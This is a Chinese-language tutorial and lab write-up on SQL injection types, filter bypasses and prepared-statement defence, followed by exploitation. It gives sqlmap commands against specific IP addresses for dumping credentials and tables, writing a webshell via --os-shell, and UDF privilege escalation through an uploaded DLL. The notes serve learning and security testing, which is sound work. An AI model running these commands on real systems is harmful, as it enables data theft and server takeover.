SQL注入虽然作为经典漏洞，但我在实战中多数情况只是点到为止，并没有深入利用过。这次来总结一下sql注入的利用方式。

## SQL注入分类和利用思路

### 报错注入

1. 网站回显数据库执行的报错信息，得到数据库信息
2. 构造会出现执行错误的 SQL 查询语句，将需要获取的信息（如版本、数据库名）放到会在错误信息输出的位置

### 时间盲注

根据延时来进行判断。

- sleep()

- benchmark()

  `benchmark(loop_count, expr)`，expr执行loop_count次，通常使用md5，SHA1等函数，执行10000次。

~~~
select benchmark(1000000, md5("testtest"));
~~~

- get_lock()

  `get_lock(str, timeout)`函数，尝试获取一个名字为 `str` 的锁 ，等待 `timeout`秒未获得，则终止函数，函数返回 0 值，成功则返回 1。

  如：两个终端，第一个获取一个名为"test"的锁，执行之后，没有释放锁；第二个终端，同样获取名为"test"的锁，执行之后，等待3秒之后未获得，返回0。

- 笛卡尔积查询，长字符串复杂正则匹配

### 基于Union的注入

- 出现两个及以上的`select`
- select 的列数要相同
- 可以使用union，列的数据类型必须兼容，兼容的含义是必须数据库可以隐含转换他们的类型

在使用union时，需要确认出列数，

- order by确定字段数

当`order by`的值 <= 列数时，是可以正常执行的，如果超出字段数，则会报错。

Group by同理，举例：

![image-20220401220913465](TyporaPicture/image-20220401220913465.png)

![image-20220401221131472](TyporaPicture/image-20220401221131472.png)

### Bool盲注

没有回显，只会返回正常（True）页面和不正常（False）页面。根据正常不正常的页面返回看是否有注入。

### 堆叠注入

堆叠注入，就是通过`;`将两个sql语句分开，在执行完第一个语句之后，后面的语句可以由攻击者任意指定，该种注入威胁更大。

![image-20220401221554806](TyporaPicture/image-20220401221554806.png)

### 宽字节注入

由于编码问题，导致数据库吃掉转义引号的反斜杠，从而引发宽字节注入。

## SQL注入防御和绕过

### 关键字过滤

过滤 `union`、`select`、`where`

- 注释符绕过
- 大小写绕过，双写绕过
- 内联注释绕过（Mysql特有）
- 编码绕过，url编码，转为16进制
- 找等价语句，函数替换

### 预编译

通常来说，在MySQL中，一条SQL语句从传入到执行经历了以下过程：检查缓存、规则验证、解析器解析为语法树、预处理器进一步验证语法树、优化SQL、生成执行计划、执行。

预编译使用占位符`?`代替字段值的部分，将SQL语句先交由数据库预处理，构建语法树，再传入真正的字段值多次执行，省却了重复解析和优化相同语法树的时间，提升了SQL执行的效率。

正因为在传入字段值之前，语法树已经构建完成，因此无论传入任何字段值，都无法再更改语法树的结构。至此，任何传入的值都只会被当做值来看待(不会当成语句执行)，不会再出现非预期的查询，这便是预编译能够防止SQL注入的根本原因。

- 模拟预编译为True，数据库使用GBK编码，则存在宽字节注入

  当`PDO::ATTR_EMULATE_PREPARES`是true的时候，将输入统一转化为字符型，并转义特殊字符，gbk编码时就存在宽字节注入。

- 默认可以支持多条SQL执行

  在参数中传入1;SELECT user(), version()来注入新的SQL，但这里有一个问题，那就是仅有第一条SQL语句的结果会显示在页面上，即使我们注入的第二条SQL被执行，也无法获取其结果。不过没关系，我们可以使用INSERT或UPDATE语句，将数据插入到表中再查询出来。

## MySQL提权

sqlmap是必不可少的工具

~~~
python .\sqlmap.py -u "http://47.106.80.112:8011/?r=content&cid=1" 
# url中存在&时要用""括起来
//指定文件
python .\sqlmap.py -r .\postinject.txt

python .\sqlmap.py -u http://101.43.138.109/ajax/api/content_infraction/getIndexableContent --data "nodeId[nodeid]=1" -proxy=http://127.0.0.1:8080
//设置代理
~~~

查看基本信息

~~~
sqlmap -u "url" --users //查看所有用户
sqlmap -u "url" --current-db //查看当前的数据库
sqlmap -u "url" --current-user //产看当前的用户
sqlmap -u "url" --is-dba //查看是否是最高权限
sqlmap -u "url" --passwords //查看所有密码
sqlmap -u "url" –hostname //查看主机名
sqlmap -u "url" privileges -U username //查看用户权限
sqlmap -u "url" –roles //查看用户角色
~~~

基本参数

~~~
--dbs  //查询数据库
-D <数据库名> --tables //查表
-D <seacms_com> -T <adword> --columns //查询字段
-D seacms_com -T adword -C ad1, ad2 --dump //获取字段内容
-D seacms_com -T adword --dump //下载整个表
~~~

### `--sql-shell` 模式

--sql-shell 可执行sql语句

### --os-shell

顾名思义，这个功能就是执行系统命令，相当于一个webshell，然而利用条件十分苛刻。

~~~
（1）必须是dba权限
（2）攻击者需要知道网站的绝对路径
（3）GPC为off，php主动转义的功能关闭
（4）secure_file_priv= 值为空

secure-file-priv参数是用来限制LOAD DATA, SELECT ... OUTFILE, and LOAD_FILE()传到哪个指定目录的。

NULL	不允许导入或导出
/tmp	只允许在 /tmp 目录导入导出
空	不限制目录

在 MySQL 5.5 之前 secure_file_priv 默认是空，这个情况下可以向任意绝对路径写文件

在 MySQL 5.5之后 secure_file_priv 默认是 NULL，这个情况下不可以写文件
~~~

sql注入漏洞的常规思路：通过注入找管理员账户密码，登录管理员账户进入后台，寻找文件上传，命令执行。。。。

### 写webshell提权

目前secure_file_priv值为空，全部条件满足，可以利用

![image-20220317151155033](TyporaPicture/image-20220317151155033.png)

![image-20220317145214431](TyporaPicture/image-20220317145214431.png)

分析一下sqlmap的利用流程，执行命令后首先是创建了一个具有上传功能的页面。

![image-20220317145520798](TyporaPicture/image-20220317145520798.png)

![image-20220317145733074](TyporaPicture/image-20220317145733074.png)

随后又利用这个页面上传了一个webshell

![image-20220317145935997](TyporaPicture/image-20220317145935997.png)

通过webshell执行命令

![image-20220317150059960](TyporaPicture/image-20220317150059960.png)

重新设置secure_file_priv的值，删掉木马

![image-20220317152149333](TyporaPicture/image-20220317152149333.png)

上传失败，提示没有权限

~~~
[15:23:07] [WARNING] it looks like the file has not been written (usually occurs if the DBMS process user has no write privileges in the destination path)
~~~

![image-20220317152340357](TyporaPicture/image-20220317152340357.png)

但是还是可以向C:/test/文件夹写入文件的。可以结合本地文件包含利用。

![image-20220317152625873](TyporaPicture/image-20220317152625873.png)

网站绝对路径收集方式

~~~
网页报错信息
phpinfo、探针
数据库查询、暴力破解
~~~

![image-20220317150541756](TyporaPicture/image-20220317150541756.png)

### UDF 提权

自定义函数，是数据库功能的一种扩展。通过上传对应的dll或so文件，在sql语句用即可调用自定义函数执行命令。

如果是 MySQL >= 5.1 的版本，必须把 UDF 的动态链接库文件放置于 MySQL 安装目录下的 lib\plugin 文件夹下文件夹下才能创建自定义函数。如果mysql版本小于5.1， udf.dll文件在windows server 2003下放置于c:\windows\system32目录，在windows server 2000下放置在c:\winnt\system32目录。

如果lib\plugin目录不存在，则需要先创建

~~~
show variables like '%plugin%';
//低版本mysql查询结果为空
~~~

不同版本的dll或so文件，在sqlmap或msf中可以找到。

~~~
sqlmap根目录/data/udf/mysql
MSF 根目录/embedded/framework/data/exploits/mysql
~~~

目前情景是SQL 注入且是高权限，plugin 目录可写且需要 secure_file_priv 无限制，直接上传

~~~
python .\sqlmap.py -r .\post.txt --file-write=""C:\Users\94323\Desktop\lib_mysqludf_sys_32.dll"" --file-dest="C:\udf.dll"
~~~

![image-20220318145137986](TyporaPicture/image-20220318145137986.png)

但不知道为什么，文件原大小为7kb，上传的文件只有1kb。

也可以用--os-shell步骤中得到的文件上传页面去上传dll文件。由此看来对udf的利用是在有webshell之后。

![image-20220318145754558](TyporaPicture/image-20220318145754558.png)

上传成功后创建自定义函数并调用命令

~~~
CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.dll';
[14:58:56] [WARNING] execution of non-query SQL statements is only available when stacked queries are supported
~~~

sqlmap提示我非查询类sql语句只有在堆叠注入时才支持，这条件就很苛刻了，我还从没在实战中遇到过堆叠注入。看来只有3306连上去才能利用udf提权。

![image-20220318154327987](TyporaPicture/image-20220318154327987.png)

udf提权利用总结

- 知道数据库的用户和密码（配置文件泄露）
- mysql可以远程登录
- mysql有写入文件的权限，即secure_file_priv的值为空。

udf提权的利用条件很苛刻，但在拥有webshell权限的情况下，通过udf提权可以获得高权限账户。





